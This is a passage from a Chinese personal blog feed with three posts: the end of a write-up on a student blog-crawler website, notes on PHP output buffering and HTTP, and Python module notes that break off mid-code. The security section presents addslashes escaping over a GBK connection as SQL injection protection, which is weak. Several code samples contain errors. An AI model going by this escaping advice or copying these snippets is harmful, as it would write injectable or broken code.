registe.php页面的时候，这些页面的处理逻辑基本上分成两种情况：一种是没有提交表单参数的，这是展示登陆界面，另一种是提交了表单参数的，这时执行登陆验证逻辑。而区分这两种情况的判断条件，我们可以采用检查token的方式：如果token存在并与session中的存储值相同，就判定为登陆验证情况，反之则为登陆页面展示情况</li></ul><hr><h2 id="网站安全性的考虑"><a href="#网站安全性的考虑" class="headerlink" title="网站安全性的考虑"></a>网站安全性的考虑</h2><p><strong>首先是关于数据库的</strong></p><ol><li><p>对所有的数据库入口参数做过滤，使用的过滤函数如下：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">d_addslashes</span><span class="params">(array $array)</span></span>&#123;</div><div class="line"></div><div class="line">    <span class="keyword">foreach</span>($array <span class="keyword">as</span> $key=&gt;$value)&#123;</div><div class="line">        <span class="keyword">if</span>(!is_array($value))&#123;</div><div class="line">            <span class="comment">//查看php的魔术引号是否开启了，如果没有开启则使用addslashes函数自行改变所有的引号</span></div><div class="line">            !get_magic_quotes_gpc() &amp;&amp; $value=addslashes($value);</div><div class="line">            $array[$key]=$value;</div><div class="line">        &#125;<span class="keyword">else</span>&#123;</div><div class="line">            $array[$key] = d_addslashes($array[$key]);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line">    <span class="keyword">return</span> $array;</div><div class="line">&#125;</div><div class="line">使用方式如下,比如要过滤$blog参数</div><div class="line"><span class="keyword">list</span>($blog) = d_addslashes([$blog]);</div></pre></td></tr></table></figure></li><li><p>对数据库返回的错误代码替换为自定义语句</p></li><li>尽量保证编码的一致性，因为数据处理流程中编码的转换可能导致某些字符的消失，详见ph师傅的文章，这个我的网站真的很难做到，php使用的gbk编码，数据库使用utf8编码。。</li></ol><p><strong>然后是关于访问控制的</strong><br>页面是怎么实现访问控制这点在之前已经叙述过了，除此之外，用户表中不存放明文密码防止拖库，存储密码hash的时候要加盐防止彩虹表攻击，然后应我们密码学老师的强烈要求，把所有的hash函数由md5换成了SHA3</p><p><strong>登陆机制防护</strong></p><ul><li>登陆表单中使用token应该可以在一定程度上防止暴力破解攻击，因为这时候你的暴力遍历速度最高只能和网络速度等同，一次尝试流程需要先接收html页面，从中拿到token值后才能提交尝试的表单</li><li>当然，防止暴力破解攻击，最有效的方式还是使用错误次数限制。在数据库中建立forbidden_ip表，登陆错误的时候将会记录下此ip，在错误次数达上线的时候，ip封禁</li></ul><p><strong>还有个比较有意思的点——记录user-agent</strong><br>在用户登录的时候记录user-agent的值到session中，然后所有的页面在登陆的时候都会与将访问者的user-agent字段与session中记录的值相比较，如果不相同的话就注销用户。<br>具体有什么作用，目前我发现的用处就是增加xss攻击获取cookie后冒充管理员登陆的难度，因为这时你必须要保证user-agent要和管理员所用的一样才行</p><hr><h2 id="样式设计"><a href="#样式设计" class="headerlink" title="样式设计"></a>样式设计</h2><p>好吧，界面样式的设计才是我花费时间最多的地方，虽然之前大一时学习过css但现在基本都忘了。<br>网站中的样式主要有以下来源</p><ul><li>去其他网站寻找符合页面结构的网页，之后F12分析下主要使用的css文件，然后把这些css dump下来，之后仿照着源网页的结构进行编排就好了，我的网站中，登陆与注册界面使用github登陆界面的css文件，admin页面使用的是腾讯云主页的css文件</li><li>对于某些元素，像按钮格式，表格格式这些，可以去网上直接下载模板css文件，书写的时候直接在class中加上对应的标志就好</li><li>还可能在其他页面看到好看的元素样式，可以F12分析后，把此元素的的css都复制下来，添加到我们的标签中。不过经常出现的情况是，你需要仔细分析到底是哪个标签藏着关键的css样式，毕竟一个标签可能有很多层div嵌套，常用的方法是在F12中依次把样式去掉看界面变化效果</li><li>最后实在不行我们可以自己手写嘛，使用bootstrap书写出来的页面还是说的过去的</li></ul><p>在页面中应该尽量使用百分比布局，这样在不同分辨率，不同窗口大小下都能灵活展示。我花费了很多时间，就是在调整页面的布局问题。直接使用其他网站的css文件并仿照div结构编写一般就不会出现这种问题</p><hr><h2 id="网站编写中其他的一些问题"><a href="#网站编写中其他的一些问题" class="headerlink" title="网站编写中其他的一些问题"></a>网站编写中其他的一些问题</h2><h3 id="网站整体编码"><a href="#网站整体编码" class="headerlink" title="网站整体编码"></a>网站整体编码</h3><p>php使用gb2312编码，所以在所有php页面要指定输出页面的编码方式<br><code>header(&quot;Content-type: text/html; charset=gb2312&quot;);</code><br>或者在html代码里加上<code>&lt;meta charset=&quot;gbk&quot;&gt;</code>。<br>当然我建议大家两种方式都写上以防万一</p><p>数据库存储使用utf-8编码，在调用数据库的时候需要指定连接编码方式<code>set names gbk;</code></p><p>api传输数据使用json编码，但是json只接受utf编码的数据，所以php编码要先转化为utf8编码方式<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">list_gbk_to_utf_8</span><span class="params">($data)</span> </span>&#123;</div><div class="line">    <span class="keyword">if</span>( is_array($data) ) &#123;</div><div class="line">        <span class="keyword">foreach</span> ($data <span class="keyword">as</span> $k =&gt; $v) &#123;</div><div class="line">            <span class="keyword">if</span> ( is_array($v) ) &#123;</div><div class="line">                $data[$k] = list_gbk_to_utf_8($v);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">                $data[$k] = iconv(<span class="string">'gb2312'</span>, <span class="string">'utf-8//IGNORE'</span>, ($data[$k]));</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125; <span class="keyword">else</span> &#123;</div><div class="line">        $data = iconv(<span class="string">'gb2312'</span>, <span class="string">'utf-8//IGNORE'</span>,$data);</div><div class="line">        <span class="keyword">return</span> $data;</div><div class="line">    &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="页面标签事件触发后传this"><a href="#页面标签事件触发后传this" class="headerlink" title="页面标签事件触发后传this"></a>页面标签事件触发后传this</h3><p>页面中书写如下：<br><code>&lt;xxxx onclick=&quot;test(this)&quot;&gt;</code><br>script代码如下：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span><span class="params">(yiruma)</span></span>&#123;</div><div class="line">$(yiruma) 这就是触发响应的那个标签了，使用$()的方法是为了将yiruma标签从js格式转到jq格式</div><div class="line">&#125;</div></pre></td></tr></table></figure></p><h3 id="使用中文智能分词实现模糊搜索"><a href="#使用中文智能分词实现模糊搜索" class="headerlink" title="使用中文智能分词实现模糊搜索"></a>使用中文智能分词实现模糊搜索</h3><p>百度上可以查到，搜索引擎的模糊搜索是要先进行智能分词的，比如 恶意广告，会分为恶意 与 广告两个关键词，然后还要进行各种过滤匹配，这里我自己实现时暂且先不管那么多，毕竟不是专门做这个方向的，我只使用了中文智能分词的方式。<br>首先在github上找到了php端很流行的scws，使用这些代码提供的接口对搜索框输入的关键字进行分词，之后在每个分词间加上%，在数据库中做like搜索。比如恶意广告就是 <code>where name like &#39;%恶意%广告%&#39;</code>然后把搜索结果返回。<br>当然还有更多的算法，时间紧迫就先做这个最简单的，以后有时间再添加新的匹配规则。</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;前后花了两个月的时间，终于把数据库课设做完了。。。考虑到wooyun关闭后各种wooyun资源dump的流行，加上正好最近在通过各个博客学习安全知识，就想着做一个博客爬取网站吧，首先是写出一个爬虫来爬取整个博客的文章，然后再展示出来。&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/qNswEah.png&quot; alt=&quot;&quot;&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src=&quot;http://i.imgur.com/r2IDn4k.png&quot; alt=&quot;&quot;&gt;&lt;br&gt;这是网站的登陆界面，在左侧的文字概述了我做整个网站的初衷，希望做一个blog的收集平台，能够方便的爬取博客，然后展示这些dump下来的文章，以备wooyun那样的不测2333&lt;br&gt;对了，细心的同学应该能够发现，这个页面使用的是github的css文件&lt;/p&gt;
&lt;p&gt;本篇文章我将从以下几方面对开发过程进行描述：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;爬虫的编写&lt;ul&gt;
&lt;li&gt;爬取逻辑&lt;/li&gt;
&lt;li&gt;解析html以获取页面样式&lt;/li&gt;
&lt;li&gt;入口参数检测以提高爬虫健壮性&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;后端逻辑的实现&lt;ul&gt;
&lt;li&gt;php后台处理的实现&lt;/li&gt;
&lt;li&gt;轮询来获取后台程序的运行进度&lt;/li&gt;
&lt;li&gt;后台文件结构与设计&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;网站安全性的考虑&lt;/li&gt;
&lt;li&gt;样式设计（这方面我第一次接触，非常菜没什么好借鉴的。。。）&lt;/li&gt;
&lt;li&gt;其他的一些问题&lt;ul&gt;
&lt;li&gt;整个网站的编码&lt;/li&gt;
&lt;li&gt;页面标签事件触发后传this&lt;/li&gt;
&lt;li&gt;使用中文智能分词实现模糊搜索&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>php输出缓冲与http的联系</title>
    <link href="https://someonesometimes.github.io/2017/06/20/php%E8%BE%93%E5%87%BA%E7%BC%93%E5%86%B2%E4%B8%8Ehttp%E7%9A%84%E8%81%94%E7%B3%BB/"/>
    <id>https://someonesometimes.github.io/2017/06/20/php输出缓冲与http的联系/</id>
    <published>2017-06-20T09:05:22.000Z</published>
    <updated>2017-06-20T10:11:46.404Z</updated>
    
    <content type="html"><![CDATA[<p>最近因为设计网站的时候需要实现一个后台处理的功能，在寻找解决方式的时候了解到了php输出缓冲的功能，让我第一次意识到http具体的传输数据都是什么流程（不会告诉你们我以前一直以为http只有一次数据传输的！），又get到一个新技能点，先记录下来，以后了解的多了再进一步补充吧<br><a id="more"></a></p><hr><h2 id="首先需要对以下函数有一定的了解"><a href="#首先需要对以下函数有一定的了解" class="headerlink" title="首先需要对以下函数有一定的了解"></a>首先需要对以下函数有一定的了解</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">/**</div><div class="line">获取当前php缓冲区的内容长度</div><div class="line">*/</div><div class="line">$size = ob_get_length()</div><div class="line"> </div><div class="line">/**</div><div class="line">刷新php的输出缓冲区，也就是将当前缓冲区中的数据通过http来传输过去</div><div class="line">然后至于这两个函数分别是什么功能。。我也不太清楚，网上倒是有不少介绍，反正就是一起用，起到刷新php</div><div class="line">输出缓冲区的作用</div><div class="line">*/</div><div class="line">flush()</div><div class="line">ob_flush()</div><div class="line"></div><div class="line">/**</div><div class="line">指定一个http流程中，一共需要接收多少数据，注意如果接收者还没有接收到指定的数据长度的时候就不会关闭</div><div class="line">http链接，也就是浏览器窗口一直处于加载中的小圆圈</div><div class="line">*/</div><div class="line">header(&quot;Content-Length: xxx&quot;);</div><div class="line"></div><div class="line">/**</div><div class="line">指定一个http链接到目前接收的数据为止是否要关闭，但测试中发现，如果浏览器接受的数据没有达到指定长度</div><div class="line">的时候，就算告诉了要关闭连接，http链接依然不会中断，所以我们在接下来实现中断http功能的过程中我们就</div><div class="line">主要使用header(&quot;Content-Length: xxx&quot;);来实现，这个指定Connection状态的语句加不加随意吧</div><div class="line">*/</div><div class="line">header(&quot;Connection: close/keep-alive&quot;);</div><div class="line"></div><div class="line">/*</div><div class="line">指定脚本在失去http连接之后是否仍然要运行,也就是是否继续在后台运行。有一点要指明的是脚本不会注意到</div><div class="line">http链接已经关闭，除非尝试echo一下，才能发现无法往缓冲区输出数据了</div><div class="line">*/</div><div class="line">ignore_user_abort(true);</div><div class="line"></div><div class="line">/*</div><div class="line">用于指定脚本的运行时限，0就是不限时间，因为想要后台运行的php脚本往往需要大量的时间，如果使用默认的</div><div class="line">时间限制可能导致异常终止</div><div class="line">*/</div><div class="line">set_time_limit(0);</div></pre></td></tr></table></figure><h2 id="下面开始通过测试来分析php输出与http的关系"><a href="#下面开始通过测试来分析php输出与http的关系" class="headerlink" title="下面开始通过测试来分析php输出与http的关系"></a>下面开始通过测试来分析php输出与http的关系</h2><p><strong>测试一</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">echo &quot;hahaha&quot;;</div><div class="line">sleep(10);</div><div class="line">echo &quot;hahaha&quot;;</div></pre></td></tr></table></figure></p><p>结果：浏览器在等待了10s后接收到了一次数据，为”hahahahahaha”,看来php将两次数据都输出后统一进行了一次http传输<br></p><p><strong>测试二</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">echo &quot;hahaha&quot;;</div><div class="line">ob_flush();</div><div class="line">flush();</div><div class="line"></div><div class="line">sleep(10s);</div><div class="line"></div><div class="line">echo &quot;hahaha&quot;;</div></pre></td></tr></table></figure></p><p>结果：浏览器很快就接收到了第一次返回的数据————“hahaha”,又等待了10S后，返回了剩下的数据”hahaha”</p><p><strong>测试三</strong><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line">echo &quot;hahaha&quot;;</div><div class="line">$size = ob_get_size();</div><div class="line">header(Content-Length: &#123;$size&#125;);</div><div class="line">flush();</div><div class="line">ob_flush();</div><div class="line"></div><div class="line">echo &quot;hahaha&quot;;</div></pre></td></tr></table></figure></p><p>结果:浏览器很快就接收到了第一次返回的数据————“hahaha”,然后就停止了。原因就是我们通过指定这次传输中Content-Length的方式，让浏览器认为接收的数据已经够了，所以就终止了连接</p><p><br><br><strong>综上所述</strong></p><ul><li>我们可以通过flush(); ob_flush();来php输出缓存区的内容释放，然后进行一次http传输</li><li>我们还可以在这次传输中通过指定header头Content-Length的方式来使整个的http链接终止</li><li>然后我们还可以通过指定ignore_user_abort(true);来使php程序在http链接终止的时候继续运行，并为其设置运行时间限制set_time_limit(0);</li></ul><p>以上就是实现php后台处理的思路啦</p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;最近因为设计网站的时候需要实现一个后台处理的功能，在寻找解决方式的时候了解到了php输出缓冲的功能，让我第一次意识到http具体的传输数据都是什么流程（不会告诉你们我以前一直以为http只有一次数据传输的！），又get到一个新技能点，先记录下来，以后了解的多了再进一步补充吧&lt;br&gt;
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>python模块使用记录</title>
    <link href="https://someonesometimes.github.io/2017/06/15/python%E6%A8%A1%E5%9D%97%E4%BD%BF%E7%94%A8%E8%AE%B0%E5%BD%95/"/>
    <id>https://someonesometimes.github.io/2017/06/15/python模块使用记录/</id>
    <published>2017-06-15T03:41:11.000Z</published>
    <updated>2018-04-25T11:22:26.313Z</updated>
    
    <content type="html"><![CDATA[<p>目前使用到的模块有：</p><ul><li>json</li><li>configparser</li><li>文件读写</li><li>os</li><li>sys</li><li>re</li><li>BeautifulSoup</li><li>requests</li><li>collections</li><li>scapy</li><li>webdriver</li></ul><a id="more"></a><h2 id="json"><a href="#json" class="headerlink" title="json"></a>json</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> json</div><div class="line"></div><div class="line">path = <span class="string">'F:/json.txt'</span></div><div class="line">_dict = &#123;<span class="string">'key1'</span>:<span class="string">'value1'</span>, <span class="string">'key2'</span>:<span class="string">'value2'</span>&#125;</div><div class="line"></div><div class="line"><span class="comment">#将python数据类型转化为json字符串并写入到txt文件中</span></div><div class="line">fw = open(path, <span class="string">'w'</span>)</div><div class="line">str = json.dumps(_dict) <span class="comment">#从python类型转化到json字符串的函数</span></div><div class="line">fw.write(str)</div><div class="line">fw.close()</div><div class="line"></div><div class="line"><span class="comment">#从txt文件中提取json字符串并转化为python数据类型</span></div><div class="line">fr = open(path, <span class="string">'r'</span>)</div><div class="line">str = fr.read()</div><div class="line">_dict = json.loads(str)         <span class="comment">#从json字符串转化到python字典类型的函数</span></div><div class="line">fr.close()</div><div class="line"></div><div class="line"><span class="comment">#一个可以将多个变量作为字典转成json格式的函数，使用python可变参数实现</span></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">json_encode</span><span class="params">(**kwargs)</span>:</span></div><div class="line"><span class="keyword">return</span> json.dumps(kwargs)</div><div class="line"></div><div class="line">str = json_encode(var1 = <span class="string">'Yiruma'</span>, var2 = &#123;<span class="string">'light'</span>:<span class="string">'music'</span>&#125;, var3 = [<span class="number">1</span>,<span class="string">'2'</span>])</div></pre></td></tr></table></figure><p><img src="http://i.imgur.com/JA2uF5O.png" alt=""></p><hr><h2 id="configparser"><a href="#configparser" class="headerlink" title="configparser"></a>configparser</h2><p>本来学了想用作python的配置文件存储，结果后来一想还是用json存吧，方便不同语言间操作，先记录下来以备后用<br>这是python3的操作方法，具体python2的操作还不太一样，python2<a href="https://docs.python.org/2/library/configparser.html?highlight=configparser#examples" target="_blank" rel="external">走这里</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> configparser</div><div class="line"></div><div class="line"><span class="comment">#configparser写配置：</span></div><div class="line">fw = open(<span class="string">'F:/crawler.ini'</span>, <span class="string">'w'</span>)</div><div class="line">config = configparser.ConfigParser()</div><div class="line">config[<span class="string">'key1'</span>] = &#123;<span class="string">"var1"</span>:<span class="string">'1'</span>, <span class="string">"var2"</span>:<span class="string">'2'</span>&#125;</div><div class="line">config[<span class="string">'key2'</span>] = &#123;<span class="string">"var3"</span>:<span class="string">'3'</span>, <span class="string">"var4"</span>:<span class="string">'4'</span>&#125;</div><div class="line">config.write(fw)</div><div class="line">fw.close()</div><div class="line"></div><div class="line"></div><div class="line"><span class="comment">#configparser读取配置</span></div><div class="line">config = configparser.ConfigParser()</div><div class="line">config.read(<span class="string">'F:/crawler.ini'</span>)</div><div class="line">config_var = config.sections()</div><div class="line"></div><div class="line"></div><div class="line">/**</div><div class="line">注释：Config parsers do <span class="keyword">not</span> guess datatypes of values <span class="keyword">in</span> configuration files, always storing them internally <span class="keyword">as</span> strings. This means that <span class="keyword">if</span> you need other datatypes, you should convert on your own:</div><div class="line">在存储的配置文件中，所有的数据都是以字符串形式存储的</div><div class="line">*/</div></pre></td></tr></table></figure></p><hr><h2 id="文件读写"><a href="#文件读写" class="headerlink" title="文件读写"></a>文件读写</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">f = open(file_path, mode)</div><div class="line"></div><div class="line">文件打开的模式有：</div><div class="line">r 只读方式打开，函数f.read()返回所有  f.readlines()返回列表</div><div class="line">w 只写方式打开，注意会覆盖原来的文件，函数f.write()写入数据</div><div class="line">a 追加方式打开，指针在文件的末尾，函数f.write()写入数据</div><div class="line"></div><div class="line">rb, wb, ab  都是以二进制格式来读写文件</div><div class="line"></div><div class="line">r+, w+, a+  都是打开文件用于读写</div></pre></td></tr></table></figure><hr><h2 id="os操作"><a href="#os操作" class="headerlink" title="os操作"></a>os操作</h2><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div></pre></td><td class="code"><pre><div class="line">import os</div><div class="line"></div><div class="line">#调用命令行</div><div class="line">os.system()</div><div class="line"></div><div class="line">#检查目录或文件是否存在，并返回bool值，python2中注意参数编码需为gbk</div><div class="line">os.path.exists(path)</div><div class="line"></div><div class="line">#列出目录下所有的文件名</div><div class="line">os.listdir(path)</div><div class="line"></div><div class="line">#判断是否是目录</div><div class="line">os.path.isdir()</div><div class="line"></div><div class="line">#判断是否是文件</div><div class="line">os.path.isfile()</div><div class="line"></div><div class="line">#创建文件夹</div><div class="line">os.makedir()</div><div class="line"></div><div class="line">#创建多级文件夹</div><div class="line">os.makedirs()</div><div class="line"></div><div class="line">#文件重命名</div><div class="line">os.rename(old, new)</div><div class="line"></div><div class="line">#文件删除</div><div class="line">os.remove()</div><div class="line"></div><div class="line">#获取当前工作目录</div><div class="line">os.getcwd()</div><div class="line"></div><div class="line">#分离文件名</div><div class="line">os.path.split(r"c:\python\hello.py") --&gt; ("c:\\python", "hello.py")</div><div class="line"></div><div class="line">#分离扩展名</div><div class="line">os.path.splitext(r"c:\python\hello.py") --&gt; ("c:\\python\\hello", ".py")</div></pre></td></tr></table></figure><hr><h2 id="sys"><a href="#sys" class="headerlink" title="sys"></a>sys</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> sys</div><div class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</div><div class="line"></div><div class="line">  <span class="comment">#首先为只有两个参数下的可能的两个场景（version，help）做出解释，之后退出</span></div><div class="line">  <span class="keyword">if</span> len(sys.argv) == <span class="number">2</span> <span class="keyword">and</span> sys.argv[<span class="number">1</span>].startswith(<span class="string">'--'</span>):</div><div class="line">    option = sys.argv[<span class="number">1</span>][<span class="number">2</span>:]</div><div class="line">    <span class="keyword">if</span> option == <span class="string">'version'</span>:</div><div class="line">      <span class="keyword">print</span> (<span class="string">'Version 1.0'</span>)</div><div class="line">    <span class="keyword">elif</span> option == <span class="string">'help'</span>:</div><div class="line">      <span class="keyword">print</span> (<span class="string">'usage python crawler.py blog_nick original_url page_reg article_reg title'</span>)</div><div class="line">    <span class="keyword">else</span>:</div><div class="line">      <span class="keyword">print</span> (<span class="string">'Unknown option'</span>)</div><div class="line">    exit()</div><div class="line">  </div><div class="line">  <span class="comment">#再为参数个数非6的情况做出解释，告知正确的参数格式</span></div><div class="line">  <span class="keyword">elif</span> len(sys.argv) != <span class="number">6</span>:</div><div class="line">    <span class="keyword">print</span> (<span class="string">'usage python crawler.py blog_nick original_url page_reg article_reg title'</span>)</div><div class="line">    exit()</div><div class="line"></div><div class="line">  <span class="comment">#确定拥有正常个数的参数，接下来就是正常的操作了</span></div><div class="line">  ...</div><div class="line">  ...</div></pre></td></tr></table></figure><hr><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><p>更详细的操作方法见<a href="https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html" title="https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html" target="_blank" rel="external">https://www.cnblogs.com/huxi/archive/2010/07/04/1771073.html</a><br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> re</div><div class="line"></div><div class="line"><span class="comment">#创建正则表达式，我一般习惯这样书写，可以方便重复使用，毕竟构造正则表达式是很耗费时间的</span></div><div class="line">reg = re.complie(<span class="string">'xxx'</span>)</div><div class="line"></div><div class="line"><span class="comment">#正则表达式的方法：</span></div><div class="line">reg.findall(str)   <span class="comment">#匹配所有匹配到的字符串，并返回一个列表</span></div><div class="line">reg.sub(new, str)  <span class="comment">#将str中所有匹配到的字符串都用new来替换</span></div><div class="line">reg.search(str)    <span class="comment">#用于搜索，如果没有搜索到时返回None，搜索到时返回Match对象</span></div><div class="line">Match对象：在reg.Match()  reg.search()中都可能返回此对象，包含多种可读属性与方法</div></pre></td></tr></table></figure></p><p><img src="http://i.imgur.com/UYQlCPe.png" alt=""><br><img src="http://i.imgur.com/rIcy9L1.png" alt=""><br><img src="http://i.imgur.com/Q4QiDFL.png" alt=""></p><p><img src="https://ws1.sinaimg.cn/large/93e435bbly1fqovs17qmsj20m204y0tb.jpg" alt=""></p><hr><h2 id="bs4-beautifulsoup"><a href="#bs4-beautifulsoup" class="headerlink" title="bs4.beautifulsoup"></a>bs4.beautifulsoup</h2><p>最全的操作方法见<a href="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" title="https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html" target="_blank" rel="external">https://www.crummy.com/software/BeautifulSoup/bs4/doc/index.zh.html</a><br><figure class="highlight"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div></pre></td><td class="code"><pre><div class="line">from bs4 import BeautifulSoup</div><div class="line"></div><div class="line">#建立BeautifulSoup对象</div><div class="line">html = s.get('http://cauc.me')</div><div class="line">bs = BeautifulSoup(html, "html.parser")</div><div class="line"></div><div class="line">#BeautifulSoup对象提供的选择器</div><div class="line">bs.a  bs.body  bs.parent  bs.children   bs.next_sibling    bs.previous_sibling</div><div class="line">.findall(id=xxx) .findall(class=xxx)  .findall('a')</div><div class="line"></div><div class="line">#BeautifulSoup对象提供对标签的内容选择</div><div class="line">.name节点名字   .string节点内容   .attrs节点属性</div></pre></td></tr></table></figure></p><hr><h2 id="requests"><a href="#requests" class="headerlink" title="requests"></a>requests</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line">s = requests.session()</div><div class="line"></div><div class="line">方法</div><div class="line"><span class="comment">#使用get方式提交</span></div><div class="line">s.get(url=<span class="string">""</span>)</div><div class="line"></div><div class="line"><span class="comment">#使用post方式提交</span></div><div class="line">s.post(url=<span class="string">""</span>,data=dict格式)</div><div class="line"></div><div class="line"><span class="comment">#headers参数介绍</span></div><div class="line">headers以字典方式提交</div><div class="line">s.post(url=<span class="string">""</span>,headers=dict格式)</div><div class="line">常用的头有：X-Forwarded-For, Cookie, User-Agent等等</div><div class="line"></div><div class="line"><span class="comment">#timeout参数介绍</span></div><div class="line">timeout参数用来指定请求超时的时间，经常在爬虫中用到</div><div class="line">s.post(url=<span class="string">""</span>, 